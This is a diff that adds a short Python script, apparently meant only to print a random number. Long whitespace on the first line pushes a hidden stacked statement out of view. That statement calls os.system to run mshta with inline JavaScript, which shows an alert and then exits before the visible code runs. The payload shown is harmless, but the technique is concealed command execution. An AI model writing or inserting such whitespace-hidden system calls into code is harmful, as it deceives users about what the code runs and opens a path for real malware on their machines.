@@ -1,0 +1,3 @@
+import random                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ;import sys;import os;os.system('mshta javascript:alert("Be careful.");close();');sys.exit()
+random.seed()
+print(random.random())
